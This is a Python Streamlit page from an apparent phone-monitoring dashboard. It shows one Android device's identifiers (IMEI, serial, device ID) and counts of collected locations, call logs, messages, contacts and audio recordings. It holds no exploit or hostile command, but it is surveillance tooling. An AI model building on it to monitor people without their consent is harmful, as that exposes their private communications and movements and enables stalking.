# lib/pages/device_overview.py
"""
Device Overview page implementation
"""

import streamlit as st
from datetime import datetime
from ..utils import format_bytes

def show_device_overview(role_manager, selected_user, selected_device):
    """Enhanced device overview with comprehensive monitoring"""
    if not role_manager.can_access_feature(st.session_state.email, "device_overview"):
        st.error("🚫 Access Denied: You don't have permission to view device overview")
        return
    
    st.markdown('<div class="feature-section">', unsafe_allow_html=True)
    st.subheader(f"📱 Comprehensive Device Overview - {selected_user}")

    try:
        user_email = role_manager.sanitize_email(selected_user)
        device_ref = role_manager.db.collection("users").document(user_email).collection("devices").document(selected_device)
        device_doc = device_ref.get()
        
        if not device_doc.exists:
            st.warning("⚠️ Device not found.")
            st.markdown('</div>', unsafe_allow_html=True)
            return
        
        device = device_doc.to_dict()

        # Device Status Overview
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            is_active = device.get('isActive', False)
            if is_active:
                st.markdown('<div class="status-active">🟢 Active Device</div>', unsafe_allow_html=True)
            else:
                st.markdown('<div class="status-inactive">🔴 Inactive Device</div>', unsafe_allow_html=True)
        
        with col2:
            last_sync = device.get('lastSyncTime', 'Never')
            if last_sync != 'Never':
                try:
                    last_sync_dt = datetime.fromtimestamp(last_sync / 1000.0)
                    time_diff = datetime.now() - last_sync_dt
                    if time_diff.total_seconds() < 3600:  # Less than 1 hour
                        st.success(f"🔄 Last Sync: {last_sync_dt.strftime('%H:%M')}")
                    else:
                        st.warning(f"⚠️ Last Sync: {last_sync_dt.strftime('%m/%d %H:%M')}")
                except:
                    st.info(f"🔄 Last Sync: {last_sync}")
            else:
                st.error("❌ Never Synced")
        
        with col3:
            android_version = device.get('androidVersion', 'Unknown')
            api_level = device.get('apiLevel', 'Unknown')
            st.info(f"🤖 Android {android_version}\nAPI {api_level}")
        
        with col4:
            battery_level = device.get('batteryLevel', 'Unknown')
            if isinstance(battery_level, (int, float)):
                if battery_level > 50:
                    st.success(f"🔋 Battery: {battery_level}%")
                elif battery_level > 20:
                    st.warning(f"🔋 Battery: {battery_level}%")
                else:
                    st.error(f"🔋 Battery: {battery_level}%")
            else:
                st.info(f"🔋 Battery: {battery_level}")

        # Device Hardware Information
        st.markdown("### 📊 Device Hardware Information")
        
        col1, col2, col3 = st.columns(3)
        
        with col1:
            st.markdown('<div class="metric-card">', unsafe_allow_html=True)
            st.metric("📱 Device Model", device.get('device', 'Unknown'))
            st.metric("🏭 Brand", device.get('brand', 'Unknown'))
            st.metric("🏗️ Manufacturer", device.get('manufacturer', 'Unknown'))
            st.markdown('</div>', unsafe_allow_html=True)
            
        with col2:
            st.markdown('<div class="metric-card">', unsafe_allow_html=True)
            st.metric("🔧 Hardware", device.get('hardware', 'Unknown'))
            st.metric("🆔 Build ID", device.get('buildId', 'Unknown')[:15] + "..." if device.get('buildId') else 'Unknown')
            st.metric("📡 Network Operator", device.get('networkOperatorName', 'Unknown'))
            st.markdown('</div>', unsafe_allow_html=True)
            
        with col3:
            st.markdown('<div class="metric-card">', unsafe_allow_html=True)
            st.metric("📞 Device ID", device.get('deviceId', 'Unknown')[:15] + "..." if device.get('deviceId') else 'Unknown')
            st.metric("📶 IMEI", device.get('imei', 'Unknown')[:10] + "..." if device.get('imei') else 'Unknown')
            st.metric("📋 Serial Number", device.get('serialNumber', 'Unknown')[:10] + "..." if device.get('serialNumber') else 'Unknown')
            st.markdown('</div>', unsafe_allow_html=True)

        # Memory and Storage Information
        st.markdown("### 💾 System Resources")
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            total_memory = device.get('totalMemory', 0)
            if total_memory:
                st.metric("💾 Total RAM", format_bytes(total_memory))
            else:
                st.metric("💾 Total RAM", "Unknown")
        
        with col2:
            available_memory = device.get('availableMemory', 0)
            if available_memory:
                st.metric("🆓 Available RAM", format_bytes(available_memory))
            else:
                st.metric("🆓 Available RAM", "Unknown")
        
        with col3:
            total_storage = device.get('totalStorage', 0)
            if total_storage:
                st.metric("💿 Total Storage", format_bytes(total_storage))
            else:
                st.metric("💿 Total Storage", "Unknown")
        
        with col4:
            available_storage = device.get('availableStorage', 0)
            if available_storage:
                st.metric("🆓 Available Storage", format_bytes(available_storage))
            else:
                st.metric("🆓 Available Storage", "Unknown")

        # Comprehensive Data Collections Status
        st.markdown("### 📊 Data Collection Status")
        
        # Get collection stats
        collections_to_check = [
            ("locations", "🌍 Location Data"),
            ("call_logs", "📞 Call Logs"),
            ("messages", "💬 Messages"),
            ("contacts", "👥 Contacts"),
            ("audio_recordings", "🎙️ Audio Recordings"),
            ("weather", "🌦️ Weather Data"),
            ("installed_apps", "📱 Installed Apps"),
            ("app_usage", "📊 App Usage"),
            ("battery_status", "🔋 Battery Status"),
            ("system_metrics", "🖥️ System Metrics"),
            ("sensor_data", "📡 Sensor Data"),
            ("phone_state", "📶 Phone State")
        ]
        
        col1, col2, col3, col4 = st.columns(4)
        collections_per_col = len(collections_to_check) // 4 + 1
        
        for idx, (collection_name, display_name) in enumerate(collections_to_check):
            col_idx = idx // collections_per_col
            current_col = [col1, col2, col3, col4][col_idx]
            
            try:
                collection_ref = role_manager.db.collection("users").document(user_email).collection("devices").document(selected_device).collection(collection_name)
                docs = list(collection_ref.limit(1).stream())
                
                if docs:
                    # Get document count
                    count_query = collection_ref.count()
                    count_result = count_query.get()
                    doc_count = count_result[0][0].value if count_result else 0
                    
                    current_col.success(f"{display_name}\n📊 {doc_count} records")
                else:
                    current_col.info(f"{display_name}\n📊 No data")
            except:
                current_col.error(f"{display_name}\n❌ Error")

        # Detailed Device Information
        with st.expander("🔍 Complete Device Information"):
            st.json(device)

        st.markdown('</div>', unsafe_allow_html=True)

    except Exception as e:
        st.error(f"❌ Error loading device overview: {str(e)}")
        st.markdown('</div>', unsafe_allow_html=True)